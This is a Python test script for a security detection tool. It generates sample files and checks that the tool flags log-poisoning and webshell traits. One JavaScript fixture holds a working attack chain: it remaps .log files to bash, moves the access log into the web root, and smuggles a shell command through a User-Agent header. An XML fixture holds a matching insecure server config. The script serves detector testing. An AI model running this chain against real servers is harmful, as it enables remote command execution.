#!/usr/bin/env python3
"""Check log-handler bindings, renamed variants and configuration near misses."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

p = argparse.ArgumentParser()
p.add_argument('--cleave', default='cleave')
p.add_argument('--scratch', required=True)
a = p.parse_args()
repo = Path(__file__).resolve().parents[2]
route = 'micro-behaviors/communications/http/server/route::'
exploit = 'objectives/execution/exploit/network-service/command-execution::log-as-cgi-poisoning-chain'
backdoor = 'objectives/command-and-control/backdoor/webshell/config::javascript-shell-served-access-log-configuration'
jsmap = route + 'javascript-shell-log-extension-mapping'
jslog = route + 'javascript-combined-log-webroot-setting'
xmlmap = route + 'xml-unix-shell-log-extension-mapping'
xmlrisk = route + 'xml-shell-log-handler-and-htdocs-access-log'
js = '''const http = require('http');
function submit(host, path, fields) {
  const body = new URLSearchParams(fields).toString();
  http.request({host, path, method: 'POST'}).end(body);
}
submit(target, '/hosts/host@7/edit/scripting/interpreters/interpreter@3/edit',
       {extension: 'log', interpreter: '/bin/bash'});
submit(target, '/hosts/host@7/edit/log',
       {format: 'combined', file: '/opt/site/public_html/requests.log'});
http.request({host: target, method: 'GET', path: '/',
  headers: {'User-Agent': 'probe"; (whoami>/opt/site/public_html/proof.txt); #'}}).end();
'''
xml = '''<?xml version="1.0"?>
<server><host><documentroot>/opt/site/htdocs</documentroot>
<scripting><enabled>yes</enabled><interpreters><interpreter>
<file>/usr/bin/bash</file><extensions><extension>.log</extension></extensions>
</interpreter></interpreters></scripting>
<log><accesslog>/opt/site/htdocs/requests.log</accesslog></log>
</host></server>'''
cases = [
    ('renamed-and-reordered.js', js, [jsmap, jslog, exploit, backdoor], []),
    ('normal-cgi.js', js.replace("extension: 'log'", "extension: 'cgi'"), [jslog], [jsmap, exploit, backdoor]),
    ('ordinary-interpreter.js', js.replace("'/bin/bash'", "'/usr/bin/python3'"), [jslog], [jsmap, exploit, backdoor]),
    ('split-fields.js', js.replace("{extension: 'log', interpreter: '/bin/bash'}", "{extension: 'log'}, {interpreter: '/bin/bash'}"), [jslog], [jsmap, exploit, backdoor]),
    ('shell-prefix-only.js', js.replace("interpreter: '/bin/bash'", "interpreter: '/bin/bash' + suffix"), [jslog], [jsmap, exploit, backdoor]),
    ('no-poisoning.js', js[:js.index('http.request({host: target')], [jsmap, jslog], [exploit, backdoor]),
    ('private-log.js', js.replace('/opt/site/public_html/requests.log', '/var/log/requests.log'), [jsmap, exploit], [jslog, backdoor]),
    ('renamed.conf', xml, [xmlmap, xmlrisk], [exploit, backdoor]),
    ('normal-cgi.conf', xml.replace('<extension>.log', '<extension>cgi'), [], [xmlmap, xmlrisk]),
    ('separate-handlers.conf', xml.replace('</file><extensions>', '</file></interpreter><interpreter><file>/usr/bin/python3</file><extensions>'), [], [xmlmap, xmlrisk]),
    ('comment-only.conf', '<?xml version="1.0"?><server><!--' + xml.split('?>', 1)[1] + '--></server>', [], [xmlmap, xmlrisk]),
    ('private-log.conf', xml.replace('/opt/site/htdocs/requests.log', '/var/log/requests.log'), [xmlmap], [xmlrisk]),
]
with tempfile.TemporaryDirectory(prefix='abyss-review-', dir=a.scratch) as tmp:
    paths = []
    for name, content, _, _ in cases:
        path = Path(tmp) / name
        path.write_text(content)
        paths.append(str(path))
    result = subprocess.run([a.cleave, '--traits-dir', str(repo), '--format', 'json', *paths], capture_output=True, text=True)
    if result.returncode:
        raise SystemExit(result.stderr or result.stdout)
    reports = {}
    decoder = json.JSONDecoder()
    remaining = result.stdout
    while remaining.strip():
        report, end = decoder.raw_decode(remaining.lstrip())
        remaining = remaining.lstrip()[end:]
        for file in report['files']:
            reports[Path(file['path']).name] = file
    for name, _, required, forbidden in cases:
        file = reports[name]
        found = {t['id'] for t in file['traits']}
        assert set(required) <= found, (name, 'missing', set(required) - found)
        assert not set(forbidden) & found, (name, 'unexpected', set(forbidden) & found)
        if name.endswith('.conf'):
            assert not [t for t in file['traits'] if t['crit'] >= 5], (name, 'hostile declaration')
        print('PASS', name)
